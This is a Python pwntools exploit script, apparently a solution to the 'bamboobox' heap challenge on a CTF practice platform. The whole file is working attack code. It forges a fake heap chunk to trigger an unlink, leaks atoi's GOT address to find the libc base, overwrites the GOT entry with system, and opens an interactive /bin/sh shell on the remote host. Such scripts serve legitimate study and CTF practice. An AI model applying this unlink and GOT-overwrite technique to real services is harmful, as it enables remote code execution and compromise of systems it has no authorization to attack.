from pwn import *

context.log_level = 'debug'

#p = process('./bamboobox')
p = remote('node4.buuoj.cn', 25285)
elf = ELF('bamboobox')
#libc = ELF('libc-2.23.so')
libc = ELF('libc-2.23.buu.so')

heaparray = 0x6020C0

def alloc(size, content):
    p.sendlineafter(b'Your choice:', b'2')
    p.sendlineafter(b'item name:', str(size).encode())
    p.sendafter(b'name of item:', content)

def edit(index, size, content):
    p.sendlineafter(b'Your choice:', b'3')
    p.sendlineafter(b'index of item:', str(index).encode())
    p.sendlineafter(b'length of item name:', str(size).encode())
    p.sendafter(b'name of the item:', content)

def delete(index):
    p.sendlineafter(b'Your choice:', b'4')
    p.sendlineafter(b'index of item:', str(index).encode())

def show():
    p.sendlineafter(b'Your choice:', b'1')

alloc(0x20, b'a')
alloc(0x80, b'a')

payload = p64(0) + p64(0x21) + p64(heaparray + 0x8 - 0x18) + p64(heaparray + 0x8 - 0x10)
payload += p64(0x20) + p64(0x90)

edit(0, 0x30, payload)
#unlink
delete(1)

edit(0, 0x20, b'a' * 0x10 + p64(0x20) + p64(elf.got['atoi']))
show()
p.recv(4)
atoi_real_addr = u64(p.recv(6).ljust(8, b'\0'))

libc_base = atoi_real_addr - libc.sym['atoi']
print('[+] libc_base-> {}'.format(hex(libc_base)))

system = libc_base + libc.sym['system']
edit(0, 0x8, p64(system))

p.sendline(b'/bin/sh')

p.interactive()